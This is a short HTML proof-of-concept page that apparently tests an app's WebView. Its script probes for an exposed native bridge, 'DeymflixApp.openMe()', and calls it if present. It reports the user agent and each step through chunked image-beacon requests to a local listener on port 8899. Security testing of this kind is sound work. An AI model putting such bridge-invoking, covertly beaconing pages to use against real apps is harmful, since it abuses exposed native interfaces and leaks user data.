<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>DFXME</title>
<style>html,body{margin:0;background:#000;color:#0f0;font:700 20px/1.4 ui-monospace,monospace}pre{padding:12px;white-space:pre-wrap}</style>
</head>
<body>
<pre id="x">DFXME: calling DeymflixApp.openMe() …</pre>
<script>
(function () {
  var EP = 'http://localhost:8899';
  function b(s) { try { s = String(s); for (var i = 0; i < s.length; i += 1400) new Image().src = EP + '/b?d=' + encodeURIComponent(s.slice(i, i + 1400)); } catch (e) {} }
  var out = document.getElementById('x');
  b('DFXME load ua=' + navigator.userAgent);
  setTimeout(function () {
    try {
      if (window.DeymflixApp && typeof window.DeymflixApp.openMe === 'function') {
        b('DFXME calling bridge');
        window.DeymflixApp.openMe();
        out.textContent = 'DFXME: bridge called';
      } else {
        b('DFXME no bridge: ' + typeof window.DeymflixApp);
        out.textContent = 'DFXME: no bridge (' + typeof window.DeymflixApp + ')';
      }
    } catch (e) {
      b('DFXME err ' + e.message);
      out.textContent = 'DFXME err ' + e.message;
    }
  }, 900);
})();
</script>
</body>
</html>
